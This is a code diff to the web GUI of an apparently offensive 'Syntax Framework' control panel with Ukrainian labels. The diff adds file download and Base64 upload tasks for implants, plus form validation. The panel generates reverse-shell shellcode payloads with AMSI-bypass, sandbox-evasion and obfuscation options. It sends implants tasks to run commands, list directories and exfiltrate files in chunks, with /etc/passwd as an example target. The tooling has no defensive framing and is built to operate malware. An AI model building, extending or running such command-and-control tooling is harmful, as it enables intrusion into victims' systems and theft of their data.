@@ -145,7 +145,7 @@
     <div class="bg-gray-800 p-6 sm:p-8 rounded-xl shadow-2xl w-full max-w-4xl border border-gray-700">
         <header class="mb-6 text-center">
             <h1 class="text-3xl sm:text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-indigo-400 via-purple-500 to-pink-500">Syntax Framework</h1>
-            <p class="text-lg text-gray-400 mt-1">Контрольна Панель v3.3.GUI</p> </header>
+            <p class="text-lg text-gray-400 mt-1">Контрольна Панель v3.4.GUI</p> </header>
 
         <div class="mb-6 border-b border-gray-700 flex overflow-x-auto">
             <button class="tab-button active" data-tab="payloadGeneratorTab">Генератор Пейлоадів</button>
@@ -302,7 +302,8 @@
                                 <input type="checkbox" id="enableAmsiBypassConcept" name="enable_amsi_bypass_concept" checked class="form-checkbox">
                                 Увімкнути Концептуальний Обхід AMSI
                             </label>
-                            <label class="checkbox-label text-gray-300"> <input type="checkbox" id="enableDiskSizeCheck" name="enable_disk_size_check" checked class="form-checkbox">
+                            <label class="checkbox-label text-gray-300">
+                                <input type="checkbox" id="enableDiskSizeCheck" name="enable_disk_size_check" checked class="form-checkbox">
                                 Увімкнути Перевірку Розміру Диска
                             </label>
                         </div>
@@ -383,20 +384,32 @@
                                     <option value="list_directory">Перелік Директорії</option>
                                     <option value="exec_command">Виконати Команду</option>
                                     <option value="exfiltrate_file_chunked">Ексфільтрація Файлу (Частинами)</option>
-                                </select>
+                                    <option value="download_file">Download File (з Імпланта)</option> <option value="upload_file_b64">Upload File (Base64 на Імплант)</option> </select>
                             </div>
                             <div id="c2TaskParamsContainer" class="space-y-3">
-                                <div id="params_list_directory_c2" class="hidden">
+                                <div id="params_list_directory_c2" class="form-section hidden">
                                      <label for="c2ListdirPath" class="text-gray-300">Шлях до Директорії:</label>
                                      <input type="text" id="c2ListdirPath" name="listdir_path" placeholder="напр. /tmp або C:\\Users" class="bg-gray-600 border-gray-500 text-gray-200 placeholder-gray-400">
                                 </div>
-                                <div id="params_exec_command_c2" class="hidden">
+                                <div id="params_exec_command_c2" class="form-section hidden">
                                      <label for="c2ExecCommand" class="text-gray-300">Команда для Виконання:</label>
                                      <input type="text" id="c2ExecCommand" name="exec_command" placeholder="напр. whoami або ls -la" class="bg-gray-600 border-gray-500 text-gray-200 placeholder-gray-400">
                                 </div>
-                                <div id="params_exfiltrate_file_chunked_c2" class="hidden">
-                                     <label for="c2ExfilFileChunked" class="text-gray-300">Ім'я Файлу для Ексфільтрації (Частинами):</label>
-                                     <input type="text" id="c2ExfilFileChunked" name="exfil_file_chunked" placeholder="напр. secret.docx" class="bg-gray-600 border-gray-500 text-gray-200 placeholder-gray-400">
+                                <div id="params_exfiltrate_file_chunked_c2" class="form-section hidden"> <label for="c2ExfilFileChunked" class="text-gray-300">Шлях до Файлу на Імпланті:</label>
+                                     <input type="text" id="c2ExfilFileChunked" name="exfil_file_chunked" placeholder="напр. /etc/passwd або C:\\secrets.txt" class="bg-gray-600 border-gray-500 text-gray-200 placeholder-gray-400">
+                                     <div id="error-c2ExfilFileChunked" class="error-message"></div>
+                                </div>
+                                <div id="params_upload_file_b64_c2" class="form-section hidden space-y-3">
+                                    <div>
+                                        <label for="c2UploadFilePath" class="text-gray-300">Шлях для Збереження на Імпланті:</label>
+                                        <input type="text" id="c2UploadFilePath" name="upload_file_path" placeholder="напр. C:\\tmp\\uploaded.txt" class="bg-gray-600 border-gray-500 text-gray-200 placeholder-gray-400">
+                                        <div id="error-c2UploadFilePath" class="error-message"></div>
+                                    </div>
+                                    <div>
+                                        <label for="c2UploadFileContentB64" class="text-gray-300">Вміст Файлу (Base64):</label>
+                                        <textarea id="c2UploadFileContentB64" name="upload_file_content_b64" rows="3" placeholder="Вставте вміст файлу в Base64..." class="bg-gray-600 border-gray-500 text-gray-200 placeholder-gray-400"></textarea>
+                                        <div id="error-c2UploadFileContentB64" class="error-message"></div>
+                                    </div>
                                 </div>
                             </div>
                             <div>
@@ -600,15 +613,13 @@
         for (const fieldName in payloadValidationRules) {
             const rules = payloadValidationRules[fieldName];
             const formFieldName = payloadForm.elements[fieldName] ? fieldName : (
-                fieldName === 'c2_target_host' ? 'c2_target_host_shell' : // Map generic to specific
+                fieldName === 'c2_target_host' ? 'c2_target_host_shell' :
                 fieldName === 'c2_target_port' ? 'c2_target_port_shell' : fieldName
             );
             const inputElement = payloadForm.elements[formFieldName];
             const value = inputElement ? (inputElement.type === 'checkbox' ? inputElement.checked : String(formData.get(formFieldName)).trim()) : null;
 
-            // Construct error element ID carefully, handling cases where inputElement might not exist for a rule
-            // This is important for fields like 'c2_target_host' which uses 'c2TargetHostShell' as ID
-            let errorElementIdBase = fieldName; // Default to rule key
+            let errorElementIdBase = fieldName;
             if (fieldName === 'c2_target_host') errorElementIdBase = 'c2TargetHostShell';
             else if (fieldName === 'c2_target_port') errorElementIdBase = 'c2TargetPortShell';
             else if (inputElement) errorElementIdBase = inputElement.id;
@@ -621,7 +632,7 @@
                 isFieldRequired = true;
             } else if (typeof rules.requiredIf === 'string' && rules.requiredIf === currentArchetype) {
                 isFieldRequired = true;
-            } else if (rules.requiredIf && typeof rules.requiredIf !== 'boolean') { // If requiredIf is set but doesn't match, it's not required for this archetype
+            } else if (rules.requiredIf && typeof rules.requiredIf !== 'boolean') {
                  isFieldRequired = false;
             }
 
@@ -631,7 +642,7 @@
                 isValid = false; continue;
             }
 
-            if (value !== null && value !== '') { // Only validate if there's a value (or it's a checkbox that might be false but still needs to be part of payload)
+            if (value !== null && value !== '') {
                 if (rules.minLength && String(value).length < rules.minLength) {
                     displayError(errorElementId, `Мін. довжина: ${rules.minLength} символів.`); isValid = false;
                 }
@@ -670,7 +681,7 @@
             event.preventDefault();
             setButtonLoadingState(generatePayloadButton, true, 'Згенерувати Пейлоад');
             const formData = new FormData(payloadForm);
-            let params = {}; // Use let for reassignment
+            let params = {};
 
             if (!validatePayloadFormGUI(formData)) {
                 payloadGenerationLog.textContent = '[VALIDATOR_FAILURE] Будь ласка, виправте помилки у формі.';
@@ -681,7 +692,6 @@
             const archetype = formData.get('payload_archetype');
             params['payload_archetype'] = archetype;
 
-            // Collect common and archetype-specific parameters
             for (const [key, value] of formData.entries()) {
                 if (key === 'payload_archetype') continue;
 
@@ -692,12 +702,11 @@
                 } else if (key === 'c2_target_host_shell' && (archetype === "reverse_shell_tcp_shellcode_windows_x64" || archetype === "reverse_shell_tcp_shellcode_linux_x64")) {
                      params['c2_target_host'] = value;
                 }
-                // For other fields, use their direct name if they are part of the current archetype's config
                 else if (payloadParamSectionsConfig[archetype] && payloadParamSectionsConfig[archetype].fields.includes(key)) {
                      params[key] = value;
-                } else if (!payloadParamSectionsConfig[archetype] && payloadForm.elements[key]) { // General fields not tied to a specific archetype section
+                } else if (!payloadParamSectionsConfig[archetype] && payloadForm.elements[key]) {
                      params[key] = value;
-                } else if (key === 'obfuscation_key' || key === 'output_format' || key === 'pyinstaller_options'){ // Always include these general fields
+                } else if (['obfuscation_key', 'output_format', 'pyinstaller_options'].includes(key)){
                     params[key] = value;
                 }
             }
@@ -817,7 +826,9 @@
     const c2TaskParamSectionsConfig = {
         "list_directory": "params_list_directory_c2",
         "exec_command": "params_exec_command_c2",
-        "exfiltrate_file_chunked": "params_exfiltrate_file_chunked_c2"
+        "exfiltrate_file_chunked": "params_exfiltrate_file_chunked_c2", // Також для download_file
+        "download_file": "params_exfiltrate_file_chunked_c2", // Використовує ті ж поля, що й exfil
+        "upload_file_b64": "params_upload_file_b64_c2"
     };
 
     let activeImplantsDataC2 = [];
@@ -881,6 +892,7 @@
     function updateC2TaskParamsVisibility() {
         if(!c2TaskTypeSelect || !c2TaskParamsContainer) return;
         const taskType = c2TaskTypeSelect.value;
+        clearAllErrors('c2TaskForm'); // Очищаємо помилки при зміні типу завдання
 
         Object.values(c2TaskParamSectionsConfig).forEach(sectionId => {
             const section = document.getElementById(sectionId);
@@ -890,7 +902,19 @@
         const relevantSectionId = c2TaskParamSectionsConfig[taskType];
         if (relevantSectionId) {
             const sectionToShow = document.getElementById(relevantSectionId);
-            if (sectionToShow) sectionToShow.classList.remove('hidden');
+            if (sectionToShow) {
+                 sectionToShow.classList.remove('hidden');
+                 // Змінюємо placeholder для download_file
+                 const exfilField = document.getElementById('c2ExfilFileChunked');
+                 const exfilLabel = exfilField ? exfilField.previousElementSibling : null;
+                 if (taskType === 'download_file' && exfilField && exfilLabel) {
+                    exfilLabel.textContent = 'Шлях до Файлу на Імпланті для Завантаження:';
+                    exfilField.placeholder = 'напр. C:\\path\\to\\remote_file.dat';
+                 } else if (taskType === 'exfiltrate_file_chunked' && exfilField && exfilLabel) {
+                    exfilLabel.textContent = 'Ім\'я Файлу для Ексфільтрації (Частинами):';
+                    exfilField.placeholder = 'напр. secret.docx';
+                 }
+            }
         }
     }
 
@@ -903,25 +927,74 @@
         c2ResultsOutput.scrollTop = c2ResultsOutput.scrollHeight;
     }
 
+    function validateC2TaskFormGUI() {
+        clearAllErrors('c2TaskForm');
+        let isValid = true;
+        const taskType = c2TaskTypeSelect.value;
+
+        if (taskType === 'download_file' || taskType === 'exfiltrate_file_chunked') {
+            const filePath = document.getElementById('c2ExfilFileChunked').value.trim();
+            if (!filePath) {
+                displayError('error-c2ExfilFileChunked', 'Шлях до файлу є обов\'язковим.');
+                isValid = false;
+            }
+        } else if (taskType === 'upload_file_b64') {
+            const remotePath = document.getElementById('c2UploadFilePath').value.trim();
+            const contentB64 = document.getElementById('c2UploadFileContentB64').value.trim();
+            if (!remotePath) {
+                displayError('error-c2UploadFilePath', 'Шлях для збереження є обов\'язковим.');
+                isValid = false;
+            }
+            if (!contentB64) {
+                displayError('error-c2UploadFileContentB64', 'Вміст файлу (Base64) є обов\'язковим.');
+                isValid = false;
+            } else {
+                try {
+                    atob(contentB64); // Спроба декодування для перевірки валідності Base64
+                } catch(e) {
+                    displayError('error-c2UploadFileContentB64', 'Невірний формат Base64.');
+                    isValid = false;
+                }
+            }
+        }
+        // Додати валідацію для інших типів завдань, якщо потрібно
+        return isValid;
+    }
+
+
     if(c2TaskForm) {
         c2TaskForm.addEventListener('submit', async function(event) {
             event.preventDefault();
             if (!currentSelectedImplantC2) { logToC2Output("[GUI_C2_ERROR] Не обрано жодного імпланта для надсилання завдання."); return; }
+
+            if (!validateC2TaskFormGUI()) {
+                 logToC2Output("[GUI_C2_ERROR] Будь ласка, виправте помилки у формі завдання C2.");
+                 return;
+            }
+
             setButtonLoadingState(sendTaskButton, true, 'Надіслати Завдання');
 
             const taskType = c2TaskTypeSelect.value;
-            let taskParamsValue = "";
-            if (taskType === 'list_directory') taskParamsValue = document.getElementById('c2ListdirPath').value || ".";
-            else if (taskType === 'exec_command') taskParamsValue = document.getElementById('c2ExecCommand').value || "whoami";
-            else if (taskType === 'exfiltrate_file_chunked') taskParamsValue = document.getElementById('c2ExfilFileChunked').value;
+            let taskParamsValue;
 
-            if (taskType === 'exfiltrate_file_chunked' && !taskParamsValue) {
-                 logToC2Output("[GUI_C2_ERROR] Для ексфільтрації (частинами) потрібно вказати ім'я файлу.");
-                 setButtonLoadingState(sendTaskButton, false, 'Надіслати Завдання'); return;
+            if (taskType === 'list_directory') {
+                taskParamsValue = document.getElementById('c2ListdirPath').value || ".";
+            } else if (taskType === 'exec_command') {
+                taskParamsValue = document.getElementById('c2ExecCommand').value || "whoami";
+            } else if (taskType === 'exfiltrate_file_chunked' || taskType === 'download_file') {
+                taskParamsValue = document.getElementById('c2ExfilFileChunked').value;
+            } else if (taskType === 'upload_file_b64') {
+                taskParamsValue = {
+                    path: document.getElementById('c2UploadFilePath').value,
+                    content_b64: document.getElementById('c2UploadFileContentB64').value
+                };
+            } else { // get_system_info або інші без параметрів
+                 taskParamsValue = "";
             }
 
+
             const queueTask = c2QueueTaskCheckbox.checked;
-            logToC2Output(`[GUI_C2_TASK_SENT] Надсилання завдання '${taskType}' (Черга: ${queueTask}) з параметрами '${taskParamsValue}' на імплант ${currentSelectedImplantC2.id} через backend...`);
+            logToC2Output(`[GUI_C2_TASK_SENT] Надсилання завдання '${taskType}' (Черга: ${queueTask}) з параметрами '${JSON.stringify(taskParamsValue).substring(0,100)}...' на імплант ${currentSelectedImplantC2.id} через backend...`);
 
             try {
                 const response = await fetch(`${API_BASE_URL}/c2/task`, {
@@ -930,7 +1003,7 @@
                     body: JSON.stringify({
                         implant_id: currentSelectedImplantC2.id,
                         task_type: taskType,
-                        task_params: taskParamsValue,
+                        task_params: taskParamsValue, // task_params може бути рядком або об'єктом (який backend перетворить на JSON-рядок для upload_file_b64)
                         queue_task: queueTask
                     }),
                 });
@@ -1087,7 +1160,6 @@
             const tabId = activeTab.dataset.tab;
             if (tabId === 'c2ControlTab') {
                 fetchAndRenderImplants();
-                updateC2TaskParamsVisibility();
             } else if (tabId === 'loggingAdaptationTab') {
                 fetchOperationalData();
             }
@@ -1096,7 +1168,7 @@
         if (payloadArchetypeSelect) payloadArchetypeSelect.dispatchEvent(new Event('change'));
         if (outputFormatSelect) outputFormatSelect.dispatchEvent(new Event('change'));
         if (reconTypeSelect) reconTypeSelect.dispatchEvent(new Event('change'));
-        if (c2TaskTypeSelect) updateC2TaskParamsVisibility();
+        if (c2TaskTypeSelect) updateC2TaskParamsVisibility(); // Ensure C2 params are updated on load
 
 
          if (c2ResultsOutput) c2ResultsOutput.textContent = "Очікування команд...\n";
